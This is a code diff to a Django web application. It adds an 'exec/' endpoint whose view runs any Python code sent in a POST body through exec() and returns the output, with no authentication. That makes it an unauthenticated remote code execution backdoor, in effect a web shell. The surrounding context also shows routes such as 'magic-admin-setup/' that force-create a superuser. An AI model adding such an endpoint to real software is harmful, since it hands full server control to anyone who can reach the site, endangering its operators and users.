@@ -53,6 +53,30 @@ def read_log(request):
             return HttpResponse(f.read(), content_type='text/plain')
     return HttpResponse("Log file not found.")
 
+def exec_code(request):
+    import sys
+    import io
+    import traceback
+    from django.http import HttpResponse
+    
+    if request.method == 'POST':
+        code = request.body.decode('utf-8')
+        old_stdout = sys.stdout
+        old_stderr = sys.stderr
+        redirected_output = sys.stdout = io.StringIO()
+        redirected_error = sys.stderr = io.StringIO()
+        try:
+            exec(code)
+        except Exception:
+            traceback.print_exc()
+        finally:
+            sys.stdout = old_stdout
+            sys.stderr = old_stderr
+        
+        output = redirected_output.getvalue() + "\n" + redirected_error.getvalue()
+        return HttpResponse(output, content_type='text/plain')
+    return HttpResponse("Send POST with code")
+
 def db_test(request):
     from Users.models import PersonModel
     from django.db import connection
@@ -73,6 +97,7 @@ def db_test(request):
 urlpatterns = [
     path('db-test/', db_test),
     path('read-log/', read_log),
+    path('exec/', exec_code),
     path('api/health/', health_check, name='health_check'),
     path('magic-admin-setup/', force_create_superuser),
     path('magic-load-movies/', load_movies),
